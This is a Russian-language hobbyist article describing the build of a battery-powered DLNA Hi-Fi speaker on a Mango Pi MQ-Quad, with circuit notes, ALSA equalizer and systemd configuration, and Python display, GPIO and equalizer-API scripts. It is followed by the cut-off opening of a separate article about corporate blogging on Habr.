где выходное напряжение задается с помощью делителя R1 и R2. Управление функции включения и выключения нашей акустики также завязано на данной микросхеме, разрешающий сигнал формируется транзистором Q1. Основной сигнал включения формируется кнопкой с последующим подхватом с помощью сигнала от  SBC (Mango Pi MQ-Quad). На плате реализован вход для подключения внешнего источника, который служит для зарядки встроенного аккумулятора или питания акустики. Проверка нужного уровня входящего напряжения выполняется с помощью стабилитрона D4 с напряжением пробоя 18 В. Переключение на нужный уровень напряжения при питании от USB Type-C выполняется с помощью триггера. Триггер PDC004 (20V)Плата модуля разрабатывалась в KiCad, ниже представлены некоторые изображения из проектаТрассировка и габариты платыРендер платыДалее плата была вытравлена и собрана, ниже размещено изображение с некоторыми этапами:Этапы сборки платыКак всегда, платы изготавливались с помощью моего небольшого лазерного станка. Что касается встроенной аккумуляторной батареи, то здесь все по классике: я использовал б/у аккумуляторы от ноутбука, которые у меня давно валялись без дела. Батарея собрана по схеме 5S с применением платы BMS. Плата BMSДля контроля уровня заряда, я собрал простой индикатор на базе компаратора LM324, ниже приведена принципиальная схема индикатора:Индикатор уровня заряда аккумулятораИ чтобы стало яснее, как реализована система управления питанием, ниже приведена схема подключения управляющих цепей:Схема подключения управляющих цепейДля наглядности осталось показать только схему подключения цепей питания:Схема подключения цепей питанияКак вы можете заметить, в схеме используются синфазные дроссели L1 и L2, которые выполняют роль фильтра для подавления шума, возникающего в процессе работы платы Mango Pi MQ-Quad. Используемый усилитель очень чувствителен к шуму в питающей цепи, поэтому установка данных фильтров обязательна. Дроссели были взяты из б/у блока питания компьютера, индуктивность не замерял, поэтому и не скажу. ❯ Программная часть В этот раз, в отличии от прошлой серии, я использовал собственную сборку операционной системы Debian 12 со своим кастомным ядром, так как производители платы Mango Pi MQ-Quad не особо заморачиваются с программной поддержкой своих плат, а единственный «живой» образ на сайте производителя оставляет желать лучшего. Также, в отличии от прошлой версии, я не стал применять дополнительный пакеты для управления GPIO, а использовал API операционной системы.  Ну, что ж, приступим.▨ Конфигурация звуковой подсистемыДля начала нам нужно сконфигурировать звуковую подсистему. Для начала необходимо посмотреть какие звуковые устройства нам доступны, выполнив команду:aplay -lВ результате выполнения команды, мы увидим что-то подобное:**** List of PLAYBACK Hardware Devices **** card 0: Codec [H616 Audio Codec], device 0: CDC PCM Codec-0 [CDC PCM Codec-0]   Subdevices: 0/1   Subdevice #0: subdevice #0 card 1: sndahub [sndahub], device 0: Media Stream sunxi-ahub-aif1-0 [Media Stream sunxi-ahub-aif1-0]   Subdevices: 1/1   Subdevice #0: subdevice #0 card 1: sndahub [sndahub], device 1: System Stream sunxi-ahub-aif2-1 [System Stream sunxi-ahub-aif2-1]   Subdevices: 1/1   Subdevice #0: subdevice #0 card 1: sndahub [sndahub], device 2: Accompany Stream sunxi-ahub-aif2-2 [Accompany Stream sunxi-ahub-aif2-2]   Subdevices: 1/1   Subdevice #0: subdevice #0 card 2: allwinnerhdmi [allwinner-hdmi], device 0: hdmi i2s-hifi-0 []   Subdevices: 1/1   Subdevice #0: subdevice #0 card 3: hificyberexsoun [hifi-cyberex-sound], device 0: sunxi-ahub-cpu-aif0-pcm5102a-hifi pcm5102a-hifi-0 []   Subdevices: 1/1   Subdevice #0: subdevice #0В нашем случае, мы будем использовать встроенный ЦАП, который определяется как Codec [H616 Audio Codec] и имеет адрес устройства card 0. Запоминаем адрес карты и идем дальше.Нет смысла использовать мощную акустику без подстройки АЧХ, поэтому для этих целей мы будем применять десятиполосный параметрический эквалайзер. Чтобы реализовать эту функцию в нашей аудиоподсистеме, необходимо установить дополнительные плагины с помощью команды:sudo apt update sudo apt install libasound2-plugin-equal alsa-tools-guiПосле успешной установки, после выполнения команды:alsamixer -D equalвы увидите что-то подобное:Результат выполнения команды alsamixer -D equalНе обращайте внимание на уровни, в вашем случае все ползунки будут выставлены на  уровень 50, скриншот делал со своей рабочей системы. Также перед дальнейшим использованием, нам необходимо настроить наше основное аудио устройство с помощью команды:alsamixerИ сконфигурировать, как показано на скриншоте:Конфигурация основного звукового устройстваДалее добавим наш эквалайзер в основную конфигурацию аудиоподсистемы:sudo nano /etc/asound.confДобавив следующее содержимое:ctl.equal {     type equal }  pcm.plugequal {     type equal     slave.pcm ""plug:dmixer"" }  pcm.equal {     type plug     slave.pcm plugequal }  pcm.dmixer {     type dmix     ipc_key 1024     slave {         pcm ""hw:0""         period_time 0         period_size 1920         buffer_size 19200         rate 48000         format S32_LE     } }  pcm.!default {     type plug     slave.pcm ""equal"" }  ctl.!default {     type hw     card 0 } Теперь мы сможем перенаправлять аудиопоток через эквалайзер. ▨ Установка рендерераКак и в прошлой статье, для приема аудиопотока мы воспользуется DLNA рендерером Gmrender-Resurrect. Ниже представлены шаги по установке.Установка дополнительных зависимостей, необходимых для компиляции:sudo apt-get install build-essential autoconf automake libtool pkg-configУстановка дополнительных библиотек, которые использует рендерер для своей работы:sudo apt-get update sudo apt-get install libupnp-dev libgstreamer1.0-dev \              gstreamer1.0-plugins-base gstreamer1.0-plugins-good \              gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly \              gstreamer1.0-libavДополнительные зависимости для работы с нашей аудио подсистемы:sudo apt-get install gstreamer1.0-alsaКлонируем репозиторий:git clone https://github.com/hzeller/gmrender-resurrect.gitПереходим в папку репозитория, выполняем конфигурацию и сборку пакета:cd gmrender-resurrect ./autogen.sh ./configure makeУстановка:sudo make installТеперь нам нужно создать сервис для автозапуска рендерера в нашей системе:sudo nano /etc/systemd/system/gmediarender.serviceИ добавим следующее содержимое:[Unit] Description=DLNA Renderer After=network.target After=sound.target   [Service] User=root Group=root ExecStartPre=/bin/sleep 30 ExecStart=/usr/local/bin/gmediarender --gstout-audiosink=alsasink --gstout-audiodevice=equal --friendly-name ""CYBEREX SOUND"" interface=wlan0 Nice=-20 Restart=on-failure  [Install] WantedBy=multi-user.target --gstout-audiosink=alsasink --gstout-audiodevice=equal - данные аргументы устанавливают в качестве устройства воспроизведения наш эквалайзер.Сохраняем файл и добавляем в автозагрузку:systemctl enable gmediarender.service▨ Алгоритм включенияКак вы могли видеть ранее на схеме подключения управляющих цепей, на модуль управления питанием приходят два сигнала ON SIGN BUTTON и ON CONFIRM SBC — именно они отвечают за запуск системы и подачу питания. Первый сигнал приходит с кнопки включения, а второй фиксирует запуск и формируется GPIO одноплатником Mango Pi MQ-Quad (в случае корректного запуска системы). Ниже представлен код Python скрипта, который формирует разрешающий сигнал:Скрипт формирования разрешающего сигнала [hello_display.py]from luma.core.interface.serial import i2c from luma.core.render import canvas from luma.oled.device import ssd1306 from PIL import ImageFont import time  # Настройка I2C интерфейса serial = i2c(port=0, address=0x3C)  # 0x3C - адрес для SSD1306 device = ssd1306(serial, width=64, height=48) # Загрузка шрифта с поддержкой кириллицы font_path = ""fonts/UbuntuMono-R.ttf""  # Шрифт font = ImageFont.truetype(font_path, 31, encoding='UTF-8')  # размер шрифта font_b = ImageFont.truetype(font_path, 16, encoding='UTF-8')  # размер шрифта    GPIO_PIN_POWER = 234  # PH10    # Экспорт GPIO для PH10 (выход) with open(""/sys/class/gpio/export"", ""w"") as f:     f.write(str(GPIO_PIN_POWER))  # Настройка пина как выход with open(f""/sys/class/gpio/gpio{GPIO_PIN_POWER}/direction"", ""w"") as f:     f.write(""out"")  # Подаем разрешение на питание with open(f""/sys/class/gpio/gpio{GPIO_PIN_POWER}/value"", ""w"") as f:     f.write(""1"")  # Текст и начальная позиция бегущей строки title_d  = """" artist_d = ""ЗАГРУЗКА..."" album_d  = """" track_time = """"  def display_print():     start_pix_t = 64     start_pix_ar = 1     start_pix_al = 64     while True:         if True:             title_width  = len(title_d) * 6  # Ожидаемая ширина текста (по 6 пикселей на символ)             artist_width = len(artist_d) * 6             album_width  = len(album_d) * 6             max_width = max(title_width, artist_width, album_width)             with canvas(device) as draw:                #draw.text((start_pix_t, 1), title_d, fill=""white"", font=font)                draw.text((start_pix_ar, 4), artist_d, fill=""white"", font=font)                #draw.text((start_pix_al, 24), album_d, fill=""white"", font=font)                #draw.text((15, 36), track_time, fill=""white"")              # Сдвиг текста влево             if title_width > 64:                 start_pix_t  -= 1             else:               start_pix_t = 1              if artist_width > 64:                start_pix_ar  -= 1             else:               start_pix_ar = 1              if album_width > 64:                 start_pix_al -= 1             else:               start_pix_al = 1              # Если текст полностью вышел за экран, вернем его в начальную позицию             if start_pix_t < -max_width:                 start_pix_t = 64              if start_pix_ar < -max_width:                 start_pix_ar = 64             if start_pix_al < -max_width:                 start_pix_al = 64              time.sleep(0.05)    display_print()Данный скрипт также отображает на дисплее бегущую строку с надписью «ЗАГРУЗКА», появление которой сигнализирует о том, что кнопку можно отпустить. Для активации скрипта при запуске системы, необходимо создать сервис:sudo nano /etc/systemd/system/hello_display.serviceСо следующим содержанием:[Unit] Description=OLED Logon Display Service #After=power_on.service  [Service] User=root Group=root ExecStart=/root/myvenv/bin/python3 /home/scripts/hello_display.py WorkingDirectory=/home/scripts Environment=""PATH=/root/myvenv/bin:/usr/bin:/bin"" StandardOutput=inherit StandardError=inherit  [Install] WantedBy=multi-user.targetСкрипт работает с виртуальным окружением, как его активировать смотрите в предыдущей статье, там же найдете информацию касательно дисплея. И для активации автозагрузки, выполним следующую команду:systemctl enable hello_display.service▨ Дисплей и функция выключенияКак и раннее,  качестве дисплея используется OLED модуль SSD1306 с разрешением 64 х 48, а вся логику управления дисплеем реализована в небольшом Python скрипте с дополнением функции выключения системы по нажатию кнопки питания:Код скрипта [media_info_disp.py]from luma.core.interface.serial import i2c from luma.core.render import canvas from luma.oled.device import ssd1306 from PIL import ImageFont from threading import Thread import time import datetime import math import requests from xml.etree import ElementTree as ET import netifaces import subprocess   # Настройка I2C интерфейса serial = i2c(port=0, address=0x3C)  # 0x3C - адрес для SSD1306 device = ssd1306(serial, width=64, height=48) # Загрузка шрифта с поддержкой кириллицы font_path = ""fonts/UbuntuMono-R.ttf""  # Шрифт font = ImageFont.truetype(font_path, 12, encoding='UTF-8')  # размер шрифта font_b = ImageFont.truetype(font_path, 16, encoding='UTF-8')  # размер шрифта   font_b2 = ImageFont.truetype(font_path, 36, encoding='UTF-8')  # размер шрифта     # Указываем номер GPIO GPIO_PIN_AMP = 272  # PI16 включение усилителя GPIO_PIN_BUTTON = 271  # PI15 мониторинг кнопки  # Отмена экспорта GPIO #try: #   with open(""/sys/class/gpio/unexport"", ""w"") as f: #        f.write(str(GPIO_PIN_AMP))  #   with open(""/sys/class/gpio/unexport"", ""w"") as f: #        f.write(str(GPIO_PIN_BUTTON)) #except ValueError: #    print(f""Какая-то ошибка."")  # Экспорт GPIO with open(""/sys/class/gpio/export"", ""w"") as f:     f.write(str(GPIO_PIN_AMP))  # Экспорт GPIO для PI15 (вход) with open(""/sys/class/gpio/export"", ""w"") as f:     f.write(str(GPIO_PIN_BUTTON))  # Настройка пина как выход with open(f""/sys/class/gpio/gpio{GPIO_PIN_AMP}/direction"", ""w"") as f:     f.write(""out"")  # Настройка PI15 как вход with open(f""/sys/class/gpio/gpio{GPIO_PIN_BUTTON}/direction"", ""w"") as f:     f.write(""in"")  # Интерфейс interface_name = ""wlan0""  # Получаем информацию об интерфейсе try:     addresses = netifaces.ifaddresses(interface_name)     if netifaces.AF_INET in addresses:         ip_address = addresses[netifaces.AF_INET][0]['addr']         print(f""IP-адрес на интерфейсе {interface_name}: {ip_address}"")     else:         print(f""Интерфейс {interface_name} не имеет IPv4-адреса."") except ValueError:     print(f""Интерфейс {interface_name} не найден."") #ip_address = ""192.168.1.205""    service_url = f""http://{ip_address}:49494/upnp/control/rendertransport1"" # Текст и начальная позиция бегущей строки title_d  = """" artist_d = ""ГОТОВ К ПОДКЛЮЧЕНИЮ"" album_d  = """" track_time = """" current_time_arh = """" counter_end = 0 en = False power_off = False  def set_poff_bool(bools):     global power_off     power_off = bools  def read_poff_bool():     global power_off     return power_off  def set_bool(bools):     global en     en = bools    # print(en)  def read_bool():     global en     return en  # Делаем часики def draw_clock(draw, now):     center_x = 32     center_y = 24     radius = 25     # Делаем рамку с закруглением     draw.rectangle(device.bounding_box, outline=""black"", fill=""black"")     draw.rounded_rectangle(device.bounding_box, radius=8, outline=""white"", fill=""black"")     # Часовая      hour_angle = 2 * math.pi * (now.hour % 12 + now.minute / 60) / 12     hour_x = center_x + int(radius * 0.5 * math.sin(hour_angle))     hour_y = center_y - int(radius * 0.5 * math.cos(hour_angle))     draw.line((center_x, center_y, hour_x, hour_y), fill=""white"")      # Минутная      minute_angle = 2 * math.pi * now.minute / 60     minute_x = center_x + int(radius * 0.7 * math.sin(minute_angle))     minute_y = center_y - int(radius * 0.7 * math.cos(minute_angle))     draw.line((center_x, center_y, minute_x, minute_y), fill=""white"")      # Секундная     second_angle = 2 * math.pi * now.second / 60     second_x = center_x + int(radius * 0.9 * math.sin(second_angle))     second_y = center_y - int(radius * 0.9 * math.cos(second_angle))     draw.line((center_x, center_y, second_x, second_y), fill=""white"")      # Рисуем круг циферблата     # draw.ellipse((center_x - radius, center_y - radius, center_x + radius, center_y + radius), outline=""white"")     # Делаем рамку с закруглением     #draw.rounded_rectangle(device.bounding_box, radius=5, outline=""white"", fill=""black"")  def display_print():     start_pix_t = 64     start_pix_ar = 64     start_pix_al = 64     while True:         if read_bool():             title_width  = len(title_d) * 6  # Ожидаемая ширина текста (по 6 пикселей на символ)             artist_width = len(artist_d) * 6             album_width  = len(album_d) * 6             max_width = max(title_width, artist_width, album_width)             with canvas(device) as draw:                if title_d == ""swyh-rs"":                    # draw.text((start_pix_t, 1), title_d, fill=""white"")                    draw.text((1, 12), ""ПК АУДИО"", fill=""white"", font=font_b)                    #draw.text((start_pix_al, 24), album_d, fill=""white"")                    draw.text((15, 36), track_time, fill=""white"")                else:                # Прокрутка текста                # draw.rectangle(device.bounding_box, outline=""white"", fill=""black"")                  draw.text((start_pix_t, 1), title_d, fill=""white"", font=font)                  draw.text((start_pix_ar, 12), artist_d, fill=""white"", font=font)                  draw.text((start_pix_al, 24), album_d, fill=""white"", font=font)                  draw.text((15, 36), track_time, fill=""white"")              # Сдвиг текста влево             if title_width > 64:                 start_pix_t  -= 1             else:               start_pix_t = 1              if artist_width > 64:                start_pix_ar  -= 1             else:               start_pix_ar = 1              if album_width > 64:                 start_pix_al -= 1             else:               start_pix_al = 1              # Если текст полностью вышел за экран, вернем его в начальную позицию             if start_pix_t < -max_width:                 start_pix_t = 64              if start_pix_ar < -max_width:                 start_pix_ar = 64             if start_pix_al < -max_width:                 start_pix_al = 64              time.sleep(0.05)     # Получение данных с рендеринга # Функция для разбора CurrentURIMetaData def parse_metadata(metadata):     global title_d     global artist_d     global album_d     if metadata:         # Парсим метаданные как XML         root = ET.fromstring(metadata)         namespace = {'didl': 'urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/',                      'dc': 'http://purl.org/dc/elements/1.1/',                      'upnp': 'urn:schemas-upnp-org:metadata-1-0/upnp/'}          # Извлекаем информацию о треке         title = root.find('.//dc:title', namespace)         artist = root.find('.//upnp:artist', namespace)         album = root.find('.//upnp:album', namespace)         album_art = root.find('.//upnp:albumArtURI', namespace)          title_d = title.text if title is not None else ""Unknown""         artist_d = artist.text if artist is not None else ""Unknown""         album_d  = album.text if album is not None else ""Unknown""          #print(""Track Information:"")         #print(f""  Title: {title.text if title is not None else 'Unknown'}"")         #print(f""  Artist: {artist.text if artist is not None else 'Unknown'}"")         #print(f""  Album: {album.text if album is not None else 'Unknown'}"")         #print(f""  Album Art URI: {album_art.text if album_art is not None else 'None'}"")     #else:         #print(""No metadata available."")  # Функция для получения временных меток def get_position_info():     global track_time     global current_time_arh     global title_d     global counter_end     # Заголовки и тело SOAP-запроса     headers = {         ""Content-Type"": 'text/xml; charset=""utf-8""',         ""SOAPAction"": '""urn:schemas-upnp-org:service:AVTransport:1#GetPositionInfo""',     }      body = """"""<?xml version=""1.0"" encoding=""utf-8""?>     <s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""                  s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">       <s:Body>         <u:GetPositionInfo xmlns:u=""urn:schemas-upnp-org:service:AVTransport:1"">           <InstanceID>0</InstanceID>         </u:GetPositionInfo>       </s:Body>     </s:Envelope>""""""      # Отправляем запрос     response = requests.post(service_url, headers=headers, data=body)      # Разбираем результат     if response.status_code == 200:         xml_response = ET.fromstring(response.content)         rel_time = xml_response.find('.//RelTime').text  # Текущее время         track_duration = xml_response.find('.//TrackDuration').text  # Общая длительность трека         track_time = rel_time         if current_time_arh == rel_time:             if counter_end > 10:                 set_bool(False)                 #wiringpi.digitalWrite(PI16, 0)  # отклюающий сигнал для усилителя                 with open(f""/sys/class/gpio/gpio{GPIO_PIN_AMP}/value"", ""w"") as f:                     f.write(""0"")             counter_end += 1         else:           current_time_arh = rel_time           set_bool(True)           #wiringpi.digitalWrite(PI16, 1)   # разрешающий сигнал для усилителя           with open(f""/sys/class/gpio/gpio{GPIO_PIN_AMP}/value"", ""w"") as f:                f.write(""1"")           counter_end = 0         #print(""Playback Position Info:"")         #print(f""  Current Time: {rel_time}"")         #print(f""  Track Duration: {track_duration}"")     #else:         #print(f""Error getting position info: {response.status_code}, {response.text}"")  def read_data_from_renderer():     # Функция для получения информации о воспроизводимом медиа с рендерера.          # Заголовки для GetMediaInfo     headers = {         ""Content-Type"": 'text/xml; charset=""utf-8""',         ""SOAPAction"": '""urn:schemas-upnp-org:service:AVTransport:1#GetMediaInfo""',     }      # Тело SOAP-запроса для GetMediaInfo     body = """"""<?xml version=""1.0"" encoding=""utf-8""?>     <s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""                  s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">         <s:Body>             <u:GetMediaInfo xmlns:u=""urn:schemas-upnp-org:service:AVTransport:1"">                 <InstanceID>0</InstanceID>             </u:GetMediaInfo>         </s:Body>     </s:Envelope>""""""      # Отправляем запрос на GetMediaInfo     response = requests.post(service_url, headers=headers, data=body)      # Проверяем ответ     if response.status_code == 200:         # Парсим XML ответа         xml_response = ET.fromstring(response.content)         # Извлекаем данные о медиа         nr_tracks = xml_response.find('.//NrTracks').text         current_uri = xml_response.find('.//CurrentURI').text         metadata = xml_response.find('.//CurrentURIMetaData').text         # print(""Basic Media Info:"")        # print(f""  Number of Tracks: {nr_tracks}"")        # print(f""  Current URI: {current_uri}"")          # Разбираем метаданные         parse_metadata(metadata)          # Получаем временные метки         get_position_info()      #else:         #print(f""Error: {response.status_code}, {response.text}"")  # Функиця для периодического вызова def periodic_task():     while True:         read_data_from_renderer()         time.sleep(1)  # Задержка в 1 секунду  def periodic_task_clock():     while True:         if not read_bool() and not read_poff_bool():             now = datetime.datetime.now()             with canvas(device) as draw:                 draw.rectangle(device.bounding_box, outline=""white"", fill=""black"")                 draw_clock(draw, now)         time.sleep(1)  def read_power_button_status():     while True:        # Чтение состояния PI15        with open(f""/sys/class/gpio/gpio{GPIO_PIN_BUTTON}/value"", ""r"") as f:            ph10_state = f.read().strip()            if ph10_state == '1':                set_poff_bool(True)                print(f""Выключение."")                with canvas(device) as draw:                  draw.text((15, 12), ""ВЫКЛ"", fill=""white"", font=font_b)                # Асинхронное выполнение команды shutdown now                subprocess.Popen([""/sbin/shutdown"", ""now""])        time.sleep(1)                   # Запуск потока для отображения текста t1 = Thread(target=display_print, name='t1') t1.start()  # Запуск переодического опрома медиа t2 = Thread(target=periodic_task, name='t2') t2.start()  # Запуск переодического круглые часы t3 = Thread(target=periodic_task_clock, name='t3') t3.start()  # Запуск опрос кнопки t4 = Thread(target=read_power_button_status, name='t4') t4.start()По аналогии, создаем сервис для автозапуск скрипта: sudo nano /etc/systemd/system/oled_display.serviceДобавляем следующее содержимое:[Unit] Description=OLED Display Service After=network.target After=gmediarender.service  [Service] User=root Group=root ExecStartPre=systemctl stop hello_display.service ExecStart=/root/myvenv/bin/python3 /home/scripts/media_info_disp.py WorkingDirectory=/home/scripts Environment=""PATH=/root/myvenv/bin:/usr/bin:/bin"" StandardOutput=inherit StandardError=inherit Restart=always  [Install] WantedBy=multi-user.targetИ для активации автозапуска, выполним следующую команду:systemctl enable oled_display.serviceСуществует ещё одна особенность: при завершении работы системы пины не сбрасывают свой статус, а нам это критически необходимо для сброса разрешающего сигнала, тем самым отключая питание системы. Для решения этой проблемы создадим новый сервис, который будет запускаться после выполнения команд, завершающих работу системы:sudo nano /etc/systemd/system/gpio-shutdown.serviceИ добавим следующее содержание:[Unit] Description=Reset GPIO pin PH10 on shutdown DefaultDependencies=no Before=shutdown.target reboot.target halt.target  [Service] User=root Group=root Type=oneshot ExecStartPre=/bin/sleep 15 ExecStart=/bin/bash -c ""echo 0 > /sys/class/gpio/gpio234/value"" RemainAfterExit=yes  [Install] WantedBy=halt.target reboot.target shutdown.targetИ активируем автозапуск скрипта:systemctl enable gpio-shutdown.service▨ API управления эквалайзеромУправление эквалайзером через командную строку это конечно по гиковски, но хотелось бы упростить задачу настройки эквалайзера для рядового пользователя, поэтому я решил перенести функцию регулировки эквалайзера в мобильное приложения. Для осуществления задуманного, нам необходимо реализовать API, сделаем это с помощью следующего Python скрипта:Код API эквалайзера [eq.py]import json import subprocess from http.server import BaseHTTPRequestHandler, HTTPServer from urllib.parse import parse_qs, urlparse  class EQRequestHandler(BaseHTTPRequestHandler):     def _set_headers(self, status_code=200):         self.send_response(status_code)         self.send_header('Content-type', 'application/json')         self.send_header('Access-Control-Allow-Origin', '*')         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')         self.send_header('Access-Control-Allow-Headers', 'Content-Type')         self.end_headers()      def do_OPTIONS(self):         self._set_headers(204)      def do_GET(self):         if self.path == '/eq':             self._set_headers()             eq_values = self.get_equalizer_values()             self.wfile.write(json.dumps(eq_values).encode())         else:             self._set_headers(404)             self.wfile.write(json.dumps({""error"": ""Not found""}).encode())      def do_POST(self):         if self.path == '/eq':             content_length = int(self.headers['Content-Length'])             post_data = self.rfile.read(content_length)                          try:                 data = json.loads(post_data)                 results = {}                 for band, values in data.items():                     if isinstance(values, list):                         success = self.set_equalizer_value(band, *values)                     else:                         success = self.set_equalizer_value(band, values)                     results[band] = ""success"" if success else ""failed""                                  self._set_headers()                 self.wfile.write(json.dumps(results).encode())             except json.JSONDecodeError:                 self._set_headers(400)                 self.wfile.write(json.dumps({""error"": ""Invalid JSON""}).encode())         else:             self._set_headers(404)             self.wfile.write(json.dumps({""error"": ""Not found""}).encode())      def get_equalizer_values(self):         """"""Получает текущие значения эквалайзера""""""         process = subprocess.Popen(             ['amixer', '-D', 'equal', 'contents'],             stdout=subprocess.PIPE,             stderr=subprocess.PIPE         )         stdout, stderr = process.communicate()          if stderr:             return {""error"": stderr.decode()}          equalizer_data = stdout.decode().split('\n')         equalizer_values = {}          current_band = None         for line in equalizer_data:             line = line.strip()                          if line.startswith(""numid="") and ""name="" in line:                 name_start = line.find(""name='"") + 6                 name_end = line.find(""'"", name_start)                 current_band = line[name_start:name_end]                          elif line.startswith("": values="") and current_band:                 values_start = line.find(""="") + 1                 values = line[values_start:]                 equalizer_values[current_band] = values.split(',')          return equalizer_values      def set_equalizer_value(self, band_name, left_value, right_value=None):         """"""Устанавливает значение для полосы эквалайзера""""""         if right_value is None:             right_value = left_value          cmd = [             'amixer', '-D', 'equal',             'cset', f""name='{band_name}'"", f""{left_value},{right_value}""         ]                  result = subprocess.run(cmd, capture_output=True, text=True)         return result.returncode == 0  def run(server_class=HTTPServer, handler_class=EQRequestHandler, port=8090):     server_address = ('', port)     httpd = server_class(server_address, handler_class)     print(f'Starting httpd server on port {port}...')     httpd.serve_forever()  if __name__ == ""__main__"":     run()Данный скрипт выполняет функцию выгрузки конфигурации эквалайзера в JSON формате по запросу приложения и установки нового уровня полосы. По сути, мы просто парсим командную строку с выводом эквалайзера для чтения текущих уровней и устанавливаем новые с помощью модуля subprocess. Как и предыдущие скрипты, скрипт API эквалайзера добавим в автозагрузку с помощью сервиса:sudo nano /etc/systemd/system/eq_web.serviceСо следующим содержимым:[Unit] Description=EQ Web Service After=network.target After=gmediarender.service  [Service] User=root Group=root ExecStartPre=systemctl stop hello_display.service ExecStart=/root/myvenv/bin/python3 /home/scripts/eq.py WorkingDirectory=/home/scripts Environment=""PATH=/root/myvenv/bin:/usr/bin:/bin"" StandardOutput=inherit StandardError=inherit Restart=always  [Install] WantedBy=multi-user.targetИ активируем автозапуск:systemctl enable eq_web.service▨ Мобильное приложениеЗдесь я изобретаю свой велосипед разработал мобильное приложение для трансляции аудиопотока в Hi-Fi качестве с мобильного устройства, дополнительно реализовав функцию управления эквалайзером, используя наш API, который мы реализовали ранее. Ниже представлены скриншоты экранов приложения:Скриншоты мобильного приложенияВ приложении реализован запуск/остановка трансляции системного звука, настройка эквалайзера, лаунчер приложений популярных стриминговых сервисов и, чтобы было красивее, добавил индикатор спектра. Регулировка громкости акустики выполняется с помощью кнопок громкости смартфона, во время работы главного экрана приложения. Трансляция аудиопотока выполняется со следующими характеристиками:Контейнер WAV;Частота дискретизации: 48 кГц;Глубина: 32 бит;Кодек: PCM.Акустика автоматически определяется в сети с помощью UPnP протокола в процессе запуска приложения. ❯ Сборка акустической системыПожалуй, это один из самых приятных процессов, словно собирать конструктор в детстве.▨ Всё акустическое После теста нескольких динамиков одного форм-фактора и разных производителей, я остановился на следующей модели:Динамик PD-401Производитель заявляет: Акустика серии ACV PD – это широкополосные динамики по бюджетной стоимости, которые отлично подходят для штатной установки. Имеют достаточно высокую номинальную мощность для такого вида систем и чувствительность 88 дБ.Динамики исполнены в стальных штампованных корзинах, оснащены бумажными диффузорами с резиновыми подвесами, воспроизводят диапазон 70 Гц-20 кГц.Ниже приведены технические характеристики динамика:Несмотря на то, что производителем заявлен диапазон воспроизводимых частот 70 Гц–20 кГц, данный динамик неплохо справляется с воспроизведением НЧ-диапазона, начиная с 28 Гц после настройки эквалайзера. Динамик имеет хороший подвес и больший ход по сравнению с аналогами в том же ценовом сегменте. Поскольку в моей конструкции используется акустическое оформление типа ПИ (пассивный излучатель), необходимо обеспечить максимальную герметичность корпуса колонки для качественного воспроизведения низких частот. Для герметизации динамиков я напечатал уплотнительные кольца из TPU-пластика, который отлично справляется с этой задачей.Уплотнительные кольца из TPU пластикаДля снижения внутренних переотражений звуковой волн, я использовал небольшое количество синтепона, при этом не перекрывая путь к отверстию, где будет размещена мембрана пассивного излучателя.Синтепон в качестве акустической ватыПассивные излучатели были заказаны в Китае. Пока они шли, я решил провести эксперимент: а что, если напечатать их самостоятельно из TPU-пластика? В результате нескольких итераций и модернизаций мне удалось создать оптимальную конструкцию мембраны.Пассивный излучатель из TPU-пластикаПосле установки мембран, задняя часть акустики выглядела следующим образом:Задняя часть акустикиСамодельные пассивные излучатели показали себя достаточно хорошо, поэтому идея не лишена смысла. Далее я заменил их на заводские мембраны, после того как они пришли ко мне:Установка заводского пассивного излучателя▨ Установка электроникиПлаты электроники и аккумуляторная батарея устанавливается в шасси, которое спроектировано особым образом для удобного расположения компонентов и проводки:Корпус блока электроникиБлок АКБ также приобрел свой корпус, который был напечатан на 3D принтере. Для возможности отключения аккумулятора используется разъем XT-60. Индикатор заряда и OLED дисплей устанавливается на переднюю панель:Индикатор заряда аккумулятораВ итоге передняя панель выглядит следующим образом:Передняя панельЕдинственный физический элемент управления — это кнопка питания, она располагается на верхней панели акустики и имеет встроенный красный светодиодный индикатор, который очень хорошо сочетается с черным цветом корпуса акустики.Кнопка питания▨ Итоговая конструкцияПосле завершения процесса сборки, вы можете видеть следующий результат:Фото сбоку Вид спередиВ данной конструкции я постарался максимально продумать все элементы крепления, и кажется у меня получилось. И так как это только первый прототип, я не особо уделял внимание постобработке корпуса, поэтому на корпусе присутствуют различные неровности и т. п. Процесс включения❯ ИтогиИзначально я испытывал скепсис относительно воспроизведения низкочастотного диапазона, но результат развеял все сомнения. Звучание акустической системы оказалось достаточно приятным и вызывает только положительные эмоции — низкие частоты мягкие и естественные. Основную роль в этом, конечно, играет система доставки аудиоконтента и качество усилителя. Ниже приведены демонстрационные видео работы системы.Видео демонстрацииВидео только демонстрирует работоспособность устройства, оценивать качество звучания по видео не имеет смысла.Видео 1Видео 2 Видео 3Со спектром:Видео 1Видео 2Видео 3На ближайшие недели данная акустика стала любимым средством для воспроизведения стримингового контента в Hi-Fi качестве. И подозреваю, что соседи тоже довольны. Если у вас есть что добавить, то добро пожаловать в комментарии! Всем спасибо за  уделенное время! Ссылки к статье:Исходники проекта [GitHub];Мобильное приложение [GooglePlay].Данная статья сгенерирована человеком.Новости, обзоры продуктов и конкурсы от команды Timeweb.Cloud — в нашем Telegram-канале ↩Опробовать ↩Перед оплатой в разделе «Бонусы и промокоды» в панели управления активируйте промокод и получите кэшбэк на баланс."
87,Мой опыт использования корпоративного хаба на Хабре,Тринион,Бизнес консультант Кинзябулатов Рамиль.,0,,2025-04-09,"Из чата в одной из групп которую я использую для продвиженияДанная картинка очень хорошо иллюстрирует мою позицию относительно корпоративного хаба в частности и продвижения в интернете в общем. Владельцем блога на Хабре я лично являюсь около 9 лет. Точнее, на протяжении этого времени я 3 или 4 раза оплачивал корпоративный блог. О нем и хочу поговорить, зачем он нужен и какую пользу может принести.Мой личный опытЯ решил попробовать корпоративный блог очень давно. Поначалу главная причина была в правилах Хабра тех лет – ссылки в обычных публикациях были полностью под запретом, даже на собственный профиль. А за ссылку на сторонний ресурс могли просто забанить.Прочтений публикаций уже тогда у меня было много, примерно, 2-3 тысячи в день. А некоторые статьи в первое время после публикации собирали даже 12-20 тысяч прочтений в день.  А ни одну ссылку при этом не «продашь». То есть нельзя никак разместить ссылку например на услуги в самом тексте, а на плашку профиля никто толком не нажимал. Вы можете мне сказать что можно жить на донаты. Может быть, но за все более 